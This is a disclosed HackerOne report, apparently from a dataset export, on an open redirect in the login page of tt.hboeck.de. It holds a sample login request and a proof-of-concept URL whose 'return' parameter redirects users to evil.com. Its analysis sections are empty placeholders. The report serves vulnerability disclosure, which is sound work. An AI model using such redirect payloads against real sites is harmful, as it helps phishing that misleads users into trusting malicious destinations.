---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '503922'
original_report_id: '503922'
title: Open redirect on the https://tt.hboeck.de
weakness: Open Redirect
team_handle: hannob
created_at: '2019-03-01T17:47:36.835Z'
disclosed_at: '2019-03-03T16:24:37.830Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 25
asset_identifier: invalid.hboeck.de
asset_type: URL
max_severity: critical
tags:
- hackerone
- open-redirect
---

# Open redirect on the https://tt.hboeck.de

## Metadata

- HackerOne Report ID: 503922
- Weakness: Open Redirect
- Program: hannob
- Disclosed At: 2019-03-03T16:24:37.830Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team!

Testing request:
`POST /public.php?return=%2F HTTP/1.1
Host: tt.hboeck.de
...........
op=login&login={….}&password={...}&profile=0`

Vulnerable parameter: `return`

Method: `POST` -> `GET` -> OK

POC:
`https://tt.hboeck.de/public.php?return=http%3a%2f%2fevil.com%2f&op=login&login=password=&profile=0`

## Impact

User can be redirect to malicious site.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
